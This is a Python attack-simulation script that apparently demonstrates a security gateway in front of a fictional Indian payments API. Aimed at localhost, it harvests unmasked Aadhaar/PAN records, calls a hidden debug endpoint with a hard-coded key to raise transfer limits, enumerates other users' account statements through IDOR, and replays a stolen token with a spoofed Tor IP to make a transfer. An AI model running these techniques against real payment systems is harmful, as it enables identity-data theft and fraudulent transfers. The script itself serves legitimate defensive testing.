"""
BharatPay Comprehensive Red-Team Attack Simulation Script
Simulates realistic cyberattacks against BharatPay through the Perimeter Security Gateway:
1. Zombie API Mass PII Harvest (GET /api/v1/kyc/aadhaar-pan-dump)
2. Shadow Debug Backdoor Limit Override (POST /api/internal/debug/override-limit)
3. BOLA / IDOR Horizontal Account Enumeration Sweep (GET /api/v2/accounts/{id}/statement)
4. Botnet Credential Replay via Tor Exit IP (POST /api/v2/payments/upi-transfer)
"""

import sys
import time
import requests
import json

BASE_URL = "http://localhost:8000"  # Perimeter Gateway intercepting BharatPay

def run_attack_simulation():
    print("\n" + "=" * 70)
    print("  [!] STARTING BHARATPAY RED-TEAM ATTACK SIMULATION [!]")
    print(f"  Target: {BASE_URL} (Protected by Perimeter Active Defense)")
    print("=" * 70 + "\n")

    session = requests.Session()

    # =========================================================================
    # Step 0: Legitimate Authentication (Priya Sharma)
    # =========================================================================
    print("[0/4] Attacker compromises credentials for Priya Sharma...")
    login_res = session.post(f"{BASE_URL}/api/v2/auth/login", json={
        "identifier": "priya.sharma@bharatpay.com",
        "password": "Password@123"
    })
    assert login_res.status_code == 200, f"Login failed: {login_res.text}"
    auth_data = login_res.json()
    token = auth_data["access_token"]
    jti = auth_data["jti"]
    account_id = auth_data["account_id"]
    headers = {"Authorization": f"Bearer {token}"}
    print(f"      Captured Session: Account #{account_id}, JTI: {jti[:10]}...\n")

    # =========================================================================
    # ATTACK 1: Zombie API Mass PII Harvest
    # =========================================================================
    print("[1/4] ATTACK 1: Exploiting Zombie API (Mass Data Exfiltration)...")
    print("      Target: GET /api/v1/kyc/aadhaar-pan-dump")
    zombie_res = session.get(f"{BASE_URL}/api/v1/kyc/aadhaar-pan-dump")
    print(f"      HTTP Status: {zombie_res.status_code}")
    if zombie_res.status_code == 200:
        records = zombie_res.json()
        print(f"      Harvested {len(records)} user KYC records!")
        sample = records[0]
        print(f"      Sample Data Exfiltrated: Name: {sample.get('full_name')}, PAN: {sample.get('pan_unmasked')}, Aadhaar: {sample.get('aadhaar_unmasked')}")
        print("      [+] NOTE: Perimeter In-Flight Data Sanitizer masked the raw identifiers!")
    elif zombie_res.status_code == 403:
        print(f"      [SHIELD] MITIGATED BY PERIMETER: {zombie_res.json().get('error')}")
    print()

    # =========================================================================
    # ATTACK 2: Undocumented Shadow Debug Backdoor
    # =========================================================================
    print("[2/4] ATTACK 2: Invoking Undocumented Shadow Backdoor...")
    print("      Target: POST /api/internal/debug/override-limit (X-Debug-Key: dev123)")
    shadow_res = session.post(
        f"{BASE_URL}/api/internal/debug/override-limit",
        json={"account_id": account_id, "new_daily_limit_paise": 2000000000},  # 2 Crore limit
        headers={"X-Debug-Key": "dev123"}
    )
    print(f"      HTTP Status: {shadow_res.status_code}")
    if shadow_res.status_code == 200:
        data = shadow_res.json()
        print(f"      Privilege Escalated! Daily Limit lifted to: Rs. {data.get('new_daily_limit_paise', 0) / 100:,.2f}")
    elif shadow_res.status_code == 403:
        print(f"      [SHIELD] MITIGATED BY PERIMETER: {shadow_res.json().get('error')}")
    print()

    # =========================================================================
    # ATTACK 3: BOLA / IDOR Horizontal Account Enumeration Sweep
    # =========================================================================
    print("[3/4] ATTACK 3: Executing BOLA / IDOR Horizontal Enumeration Sweep...")
    print("      Target: GET /api/v2/accounts/{account_id}/statement across accounts #1002 - #1015")
    probed_count = 0
    blocked_count = 0
    for victim_id in range(1002, 1016):
        bola_res = session.get(f"{BASE_URL}/api/v2/accounts/{victim_id}/statement", headers=headers)
        probed_count += 1
        if bola_res.status_code == 403:
            blocked_count += 1
        time.sleep(0.04)
    print(f"      Completed {probed_count} unauthorized account probe attempts.")
    print(f"      BOLA Sweep Triggered telemetry across {probed_count} unique Object IDs under session {jti[:10]}!\n")

    # =========================================================================
    # ATTACK 4: Credential Replay / Botnet Hijack via Tor Exit IP
    # =========================================================================
    print("[4/4] ATTACK 4: Replaying Stolen Customer JWT from Tor Exit Node...")
    spoofed_tor_ip = "185.220.101.5"
    spoofed_bot_ua = "python-requests/2.31.0"
    print(f"      Source IP: {spoofed_tor_ip} [Tor Exit Node]")
    print(f"      User-Agent: {spoofed_bot_ua}")
    replay_res = session.post(
        f"{BASE_URL}/api/v2/payments/upi-transfer",
        json={
            "from_vpa": "priya.sharma@bharatpay",
            "to_vpa": "swiggy@bharatpay",
            "amount_paise": 75000,  # Rs. 750
            "note": "Botnet Replay Fraudulent Transfer",
            "idempotency_key": f"tor_replay_{int(time.time())}"
        },
        headers={
            "Authorization": f"Bearer {token}",
            "X-Forwarded-For": spoofed_tor_ip,
            "User-Agent": spoofed_bot_ua
        }
    )
    print(f"      HTTP Status: {replay_res.status_code}")
    if replay_res.status_code in [200, 400]:
        print(f"      Replay executed over wire! Status: {replay_res.status_code}")
    elif replay_res.status_code == 403:
        print(f"      [SHIELD] MITIGATED BY PERIMETER: {replay_res.json().get('error')}")

    print("\n" + "=" * 70)
    print("  [*] ATTACK SIMULATION COMPLETE: PERIMETER THREAT TELEMETRY LOGGED [*]")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    run_attack_simulation()
